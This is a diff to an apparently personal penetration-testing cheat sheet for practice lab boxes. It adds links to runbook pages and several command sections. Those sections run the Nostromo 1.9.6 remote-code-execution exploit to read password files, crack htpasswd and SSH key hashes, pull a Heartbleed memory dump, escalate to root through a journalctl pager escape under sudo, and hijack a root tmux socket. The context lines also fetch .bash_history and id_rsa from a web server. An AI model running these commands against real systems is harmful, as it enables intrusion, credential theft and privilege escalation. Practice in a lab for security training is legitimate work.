@@ -5,6 +5,12 @@
 
 # CTRL+F ANYTHING
 
+> [!tip] 💡 Starting a new box
+> Open [[RUNBOOK V2/00 - Follow-Along Controller|RUNBOOK V2 Follow-Along Controller]]. It gives the exact order, output decisions, failure routes, exploit-editing lane, and closeout steps. Use this sheet when you already know the technique and need a command quickly.
+
+> [!tip] 🛠️ Editing a public exploit
+> Open [[RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing and Resource Guide]] before changing a PoC. It links the command, source-review, `nano` edit, syntax-check, payload, and troubleshooting sequence.
+
 ## 1. RECON & PORT SCANNING
 
 ```bash
@@ -250,6 +256,83 @@ curl -i http://$BoxIP:$WebPort/robots.txt
 gobuster dir -u http://$BoxIP:$WebPort/ -w $Wordlist -x txt,py,html -t 30 -o $BoxDir/nmap/gobuster.txt
 curl -s http://$BoxIP:$WebPort/.bash_history -o $BoxDir/loot/bash_history.txt
 curl -s http://$BoxIP:$WebPort/.ssh/id_rsa -o $KeyFile
+```
+
+### NOSTROMO 1.9.6 RCE AND PROTECTED SSH ARCHIVE
+
+```bash
+# Review and copy the standalone CVE-2019-16278 proof of concept
+searchsploit nostromo 1.9.6
+searchsploit -x 47837
+searchsploit -m 47837
+mkdir -p $BoxDir/exploits
+cp 47837.py $BoxDir/exploits/nostromo-47837.py
+sed -i 's/^cve2019_16278\.py$/# cve2019_16278.py/' $BoxDir/exploits/nostromo-47837.py
+python2 -m py_compile $BoxDir/exploits/nostromo-47837.py
+
+# Prove command execution before requesting a callback
+python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort "id"
+
+# Read the Nostromo configuration and extract the Basic-auth record privately
+python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort \
+  "cat /var/nostromo/conf/nhttpd.conf"
+python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort \
+  "cat /var/nostromo/conf/.htpasswd" > $BoxDir/loot/htpasswd-response.txt 2>&1
+sed -n '/^david:/p' $BoxDir/loot/htpasswd-response.txt > $BoxDir/loot/htpasswd.hash
+john --wordlist=$Wordlist $BoxDir/loot/htpasswd.hash
+
+# Authenticate once to download and inspect the protected archive
+curl -fsS -u "$Username:$Password" \
+  "http://$BoxIP/~$Username/protected-file-area/backup-ssh-identity-files.tgz" \
+  -o $BoxDir/loot/backup-ssh-identity-files.tgz
+tar -tzf $BoxDir/loot/backup-ssh-identity-files.tgz
+tar -xzf $BoxDir/loot/backup-ssh-identity-files.tgz -C $BoxDir/loot/
+
+# Crack the encrypted SSH key offline, then validate SSH access
+ssh2john $BoxDir/loot/home/$Username/.ssh/id_rsa > $BoxDir/loot/$Username-id-rsa.john
+john --wordlist=$Wordlist $BoxDir/loot/$Username-id-rsa.john
+chmod 600 $BoxDir/loot/home/$Username/.ssh/id_rsa
+ssh -i $BoxDir/loot/home/$Username/.ssh/id_rsa \
+  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+  $Username@$BoxIP
+```
+
+### ARGUMENT-SPECIFIC JOURNALCTL PAGER ESCAPE
+
+```bash
+# Read the user-owned helper to capture the exact sudo arguments
+sed -n '1,240p' /home/$Username/bin/server-stats.sh
+sudo -n /usr/bin/journalctl -n5 -unostromo.service
+# Inside the pager, enter: !/bin/bash
+id
+whoami
+```
+
+### HEARTBLEED AND ENCRYPTED SSH KEYS
+
+```bash
+# Confirm the TLS memory-disclosure condition with Nmap
+sudo nmap -Pn -n -p $SSLPort --script ssl-heartbleed -oA $BoxDir/nmap/ssl-heartbleed $BoxIP
+# Review and copy a public proof of concept, then save its output as private loot
+searchsploit -x 32764
+searchsploit -m 32764
+python2 $BoxDir/exploits/heartbleed-32764.py $BoxIP -p $SSLPort > $BoxDir/loot/heartbleed-output.txt
+# Search repeated captures locally for printable candidate material
+strings -a -n 8 $BoxDir/loot/heartbleed-loop.txt | grep -v '^0x'
+# Convert an exposed space-separated hex key representation to a protected key file
+xxd -r -p $BoxDir/loot/hype_key $BoxDir/loot/hype_key.decoded
+chmod 600 $BoxDir/loot/hype_key.decoded
+ssh-keygen -y -f $BoxDir/loot/hype_key.decoded > /dev/null
+```
+
+### TMUX SESSION ACCESS THROUGH A UNIX SOCKET
+
+```bash
+find / -type s -ls 2>/dev/null
+ls -la $SocketDir
+tmux -S $TmuxSocket ls
+tmux -S $TmuxSocket attach-session -t 0
+id
 ```
 
 ### COMMAND INJECTION
